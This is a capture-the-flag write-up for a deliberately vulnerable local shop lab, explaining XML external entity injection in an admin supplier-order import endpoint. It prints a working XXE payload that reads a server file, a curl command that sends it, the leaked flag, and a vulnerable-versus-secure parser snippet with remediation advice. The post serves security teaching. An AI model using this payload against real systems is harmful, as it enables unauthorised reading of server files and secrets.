---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-02-18T08:00:00Z
title: "XML External Entity Injection: Exploiting a Legacy Supplier Import Endpoint"
slug: xxe-supplier-order-import
draft: false
tags:
  - writeup
  - injection
  - xxe
  - ctf
description: Exploiting an insecure XML parser in the supplier order import feature to read arbitrary server-side files and retrieve a flag.
---

The OopsSec Store admin panel has a supplier order import page that parses XML. The parser resolves external entities, so we can use it to read arbitrary files off the server.

## Table of contents

## Lab setup

The lab requires Node.js. From an empty directory:

```bash
npx create-oss-store oss-store
cd oss-store
npm start
```

Head to `http://localhost:3000`.

## Prerequisites -- gaining admin access

The import feature is admin-only. You'll need to get admin access first through another vulnerability.

## Reconnaissance

### The supplier import page

Once you have admin access, the dashboard at `/admin` has a "Supplier Orders" link pointing to `/admin/suppliers`.

![Import Supplier Order](../../assets/images/xxe-supplier-order-import/import-supplier-order.png)

The page has a textarea for pasting XML and an "Import Order" button. A sample template is already filled in:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
  <supplierId>SUP-001</supplierId>
  <orderId>PO-2026-0042</orderId>
  <total>1250.00</total>
  <notes>Standard delivery — net 30 terms</notes>
</order>
```

### The API

Submitting the form sends a POST to `/api/admin/suppliers/import-order` with `Content-Type: application/xml`. The response comes back with the parsed fields:

```json
{
  "message": "Supplier order imported successfully.",
  "order": {
    "id": "...",
    "supplierId": "SUP-001",
    "orderId": "PO-2026-0042",
    "total": 1250,
    "notes": "Standard delivery — net 30 terms",
    "createdAt": "..."
  }
}
```

The `notes` field comes straight from the XML input. That's our injection point.

## Exploiting the XXE vulnerability

### The target file

Send malformed XML (missing required fields, bad structure) and the endpoint gives back verbose errors. The response includes a `debug` object that leaks the absolute path to a file:

```json
{
  "error": "Missing required fields: supplierId and orderId.",
  "debug": {
    "config": "/absolute/path/to/flag-xxe.txt",
    "received": { "supplierId": null, "orderId": null }
  }
}
```

That's `flag-xxe.txt` at the project root.

### The payload

XML supports Document Type Definitions (DTDs) that let you define entities. A `SYSTEM` entity tells the parser to load content from an external resource:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///absolute/path/to/flag-xxe.txt">
]>
<order>
  <supplierId>SUP-001</supplierId>
  <orderId>PO-2026-0001</orderId>
  <total>0</total>
  <notes>&xxe;</notes>
</order>
```

When the parser hits `&xxe;`, it reads the file and drops its contents into `notes`.

### Send it

Paste it into the import form, or fire it off with curl:

```bash
curl -X POST http://localhost:3000/api/admin/suppliers/import-order \
  -H "Content-Type: application/xml" \
  -H "Cookie: authToken=<your-admin-jwt>" \
  -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///absolute/path/to/flag-xxe.txt">]><order><supplierId>SUP-001</supplierId><orderId>PO-XXE</orderId><total>0</total><notes>&xxe;</notes></order>'
```

![Flag](../../assets/images/xxe-supplier-order-import/flag-xxe.png)

### The flag

The file contents come back in `notes`:

```json
{
  "message": "Supplier order imported successfully.",
  "order": {
    "supplierId": "SUP-001",
    "orderId": "PO-XXE",
    "total": 0,
    "notes": "# Supplier Integration API Configuration\n# Generated automatically — do not edit\n\napi_key=OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}\nendpoint=https://suppliers.oss-store.internal/api/v2\ntimeout=30000\n"
  }
}
```

The flag is `OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}`.

### Secure implementation

```typescript
// VULNERABLE — resolves external entities from user input
const doc = libxmljs.parseXmlString(rawXml, { noent: true, dtdload: true });

// SECURE — disable DTD processing entirely
const doc = libxmljs.parseXmlString(rawXml);
// Additionally: strip or reject any DOCTYPE declarations before parsing
```

After the fix:

![Fix](../../assets/images/xxe-supplier-order-import/fix-xxe.png)

## Vulnerability chain

This exploit chains two bugs:

1. Admin access, for example via JWT forgery (CWE-347) or mass assignment (CWE-915)
2. XXE injection (CWE-611) -- the XML parser resolves external entity declarations, letting you read arbitrary files off the server

## Remediation

To fix this in a real app:

- Disable DTD processing in your XML parsers. Most libraries have flags to reject DOCTYPE declarations outright.
- Disable external entity resolution. Tell the parser to ignore `SYSTEM` and `PUBLIC` entity declarations.
- Use JSON for data exchange where you can. JSON doesn't have entity expansion.
- Strip DOCTYPE declarations from XML before parsing.
- Run the app process with minimal file system permissions. It shouldn't be able to read config files it doesn't need.
